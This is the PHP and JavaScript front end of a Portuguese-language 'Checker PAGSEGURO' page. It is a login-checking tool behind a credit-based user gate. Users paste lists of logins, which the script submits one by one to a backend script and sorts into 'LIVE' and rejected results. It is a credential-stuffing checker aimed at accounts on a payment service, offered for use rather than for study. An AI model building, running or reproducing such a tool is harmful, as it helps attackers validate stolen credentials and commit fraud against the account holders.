<?php 

error_reporting(0);

set_time_limit(0);

session_start();



if(!isset($_SESSION['usuario']) and !isset($_SESSION['senha'])){

echo '<script language= "JavaScript">location.href="/"</script><br>';

  die();

}



$array_usuarios = file("../../../../jeaotop.txt");

$total_usuarios_registrados = count($array_usuarios);



$continuar = false;

for($i=0;$i<count($array_usuarios);$i++){

  $explode = explode("|" , $array_usuarios[$i]);

  if($_SESSION['usuario'] == $explode[0]){



    $_SESSION['senha'] = $explode[1];

    $_SESSION['rank'] = $explode[2];

    $_SESSION['creditos'] = $explode[3];

    $_SESSION['foto'] = $explode[4];

    $continuar = true;

  }

}



if(!$continuar){

echo '<script language= "JavaScript">location.href="/"</script><br>';

die();

}



?>


	<body>

<!DOCTYPE>
<html>
    <head>
        <script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
        <link rel="icon" type="image/png" href="https://cloud.githubusercontent.com/assets/6863089/19411302/92a1f72e-92d5-11e6-85a0-16968b021718.png">
        <title>Checker PAGSEGURO</title>
	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <style type="text/css">

	.btn-verde {
        font-size: .7rem;
        color: white;
        background: #d9534f;
        padding: 4px;
        outline: none;
        border: none;
        width: 4rem;
        cursor: pointer;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
      .btn-verde:hover {
        background: #d9535t;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
      .btn-verde:focus {
        background: #d9535t;
        box-shadow: inset 0px 0px 1px 0px #333;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
	  .btn-vermelho {
        font-size: .7rem;
        color: white;
        background: #BB4F00;
        padding: 4px;
        outline: none;
        border: none;
        width: 4rem;
        cursor: pointer;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
      .btn-vermelho:hover {
        background: #C65400;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
      .btn-vermelho:focus {
        background: #C65400;
        box-shadow: inset 0px 0px 1px 0px #333;
        -webkit-transition: all .3s ease;
        -moz-transition: all .3s ease;
        -ms-transition: all .3s ease;
        -o-transition: all .3s ease;
        transition: all .3s ease;
      }
	  .label {
        display: inline;
        color: #fff;
		padding: 1px 3px 1px 3px;
        text-align: center;
        white-space: nowrap;
        vertical-align: baseline;
        border-radius: .13em;
		font-size: 12px;
      }
      .label-verde {
        background-color: #2ecc71;
      }
	  .label-vermelho {
        background: #e74c3c;
      }
      .label-laranja {
        background: #f39c12;
      }
      .label-roxo {
        background: #9b59b6;
      }

      .painel-head {
        font-size: .9rem;
        border-bottom: 1px solid #eee;
        background-color: #FAFAFA;
        padding: 12px;
        width: 800px;
      }
      .painel-body {
        font-size: 1rem;
        border-bottom: 1px solid #eee;
        background-color: rgba(0, 0, 0, 0.5);
		color:white;
        padding: 12px;
        width: 800px;
      }
	.painel-titulo {
		color:white;
        font-size: 150%;
        background-color:#25373D;
        padding: 12px;
        width: 100%;
		height: 45px;
    }
	.painel-conteudo {
        font-size: 120%;
        background-color:white;
        padding: 12px;
        width: 100%;
		height: 50%;
	}
	.painel-taprovadas {
		color:white;
        font-size: 150%;
        background-color:#04B431;
        padding: 12px;
		border-radius:6px 6px 0px 0px;
        width: 80%;
		height: 45px;
    }
	.painel-treprovadas {
		color:white;
        font-size: 150%;
        background-color:#B43104;
		border-radius:6px 6px 0px 0px;
        padding: 12px;
        width: 80%;
		height: 45px;
    }
	.painel-caprovadas {
        padding: 12px;
		background-color: #FAFAFA
		border-radius:0px 0px 6px 6px;
        width: 80%;
		border-bottom: #04B431 2px solid;
    }
	.painel-creprovadas {
        padding: 12px;
		background-color: ##FAFAFA;
        width: 80%;
		border-bottom: #B43104 2px solid;
    }
    #titulo {
                color: #2C3A48;
                font-weight: bold;
            }
	</style>
      <style>
  a:link 
{ 
 text-decoration:none; 
} 
  html {
   font-size: 16px;
   background-color: #e8e8e8;
   color: #1ABB9C;
   font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
   overflow: hidden;
 }
 body {    
  background-color: #e8e8e8;
}
.lista {
  width: 95%;
  height: 150px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.lista:focus {
  outline: none;
}
.afs {
  font-weight: bold;
              }
            .green {
                background-color: rgba(92, 180, 91, 1);
                color: rgba(255, 255, 255, 0.87);
                padding: 0.25em 0.5em;
                border-radius: 3px;

}
.green {
  background-color: #4caf50;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.red {
  background-color: #f44336;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.check {
  background-color: #fcc100;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
            .botao2 {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(245, 203, 130, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .botao2:hover {
                background-color: rgba(255, 255, 255, 0.87);
                color: #2C3A48;
            }
            .botao2:focus {
                outline: none;
            }
            .botao {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(85, 216, 234, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.botao:hover {
  background-color: rgba(255, 255, 255, 0.87);
  color: #2C3A48;
}
.botao:focus {
  outline: none;
}
.test {
  width: 660px;
  height: 200px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.test:focus {
 outline: none;
}
.test2 {
  width: 660px;
  height: 200px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.test2:focus {
 outline: none;
}
.back {
 color: #1ABB9C;
 text-decoration: none;
}
.back:hover {
  text-shadow: 1px 1px 1px #1ABB9C;
}
</style>
    </head>
    <body>

<center>
    <a href="../../"><input type="submit" class="botao botao-primary" value="Voltar"></a><br>
    <font size="7">Checker  Pagseguro</font></b><br>
    <span id="demo" style="color:orange;"><b>APARECEM APENAS LOGINS LIVE</b></span>
 <center>
        <textarea name="lista" id="lista" class="lista"></textarea>
<br><br>
</span> - Aprovadas : <span id="ap" class="green">0</span> - Reprovadas : <span id="rp" class="red">0</span> - Testadas: <span id="total" class="check">0</span>

<br><br>
		<input type="submit" class="botao" onclick="enviar();" value="Testar" /><button type="submit" id="x" name="x" class="botao2" onclick="stop()">Parar</button>
            <br><br>
			
<script title="ajax do checker">
function contar1(){
		$(document).ready(function() {
			var count = parseInt($('#ap').html());
			count++;
			$('#ap').html(count+"");
		});
	}
	function contar2(){
		$(document).ready(function() {
			var count = parseInt($('#rp').html());
			count++;
			$('#rp').html(count+"");
		});
	}
	function contar2b(){
		$(document).ready(function() {
			var count = parseInt($('#rpb').html());
			count++;
			$('#rpb').html(count+"");
		});
	}
	function contar3(){
		$(document).ready(function() {
			var count = parseInt($('#total').html());
			count++;
			$('#total').html(count+"");
		});
	}
	function contar4(){
		$(document).ready(function() {
			var count = parseInt($('#linhas').html());
			count++;
			$('#linhas').html(count+"");
		});
	}
function randomFrom(array) {
    return array[Math.floor(Math.random() * array.length)];
}
function enviar() {
                var linha = $("#lista").val();
                var linhaenviar = linha.split("\n");
                linhaenviar.forEach(function (value, index) {
					contar4();
                    setTimeout(
                            function () {
                                $.ajax({
                                    url: "pagseguro.php" + '?lista=' + value,
                                    type: 'GET',
									async: true,
                                    success: function (resultado) {
										contar3();
										if(resultado.match("LIVE →")){
											removelinha();
											test(resultado + "");
											contar1();
										}
										if(resultado.match("#REPROVADA")){
											removelinha();
											test2(resultado + "");
											contar2();
										}
										if(resultado.match("#BUG")){
											removelinha();
											bugs(resultado + "");
											contar2b();
										}
                                    }
                                });

                            }, 500 * index);

                });
            }
            function test(str) {
                $(".test").append(str + "<br>");
            }
            function test2(str) {
                $(".test2").append(str + "<br>");
            }
			function bugs(str) {
                $(".bugs").append(str + "<br>");
            }
            function removelinha() {
                var lines = $("#lista").val().split('\n');
                lines.splice(0, 1);
                $("#lista").val(lines.join("\n"));
            }
</script>
        </div>
    </center>
    <center>
            
             <textarea class="test" id="resultado" style="color: #00EE00;"></textarea>
              <textarea class="test2" id="resultado2" style="color: #FC0F0F;"></textarea>

    </center>
</body>
</html>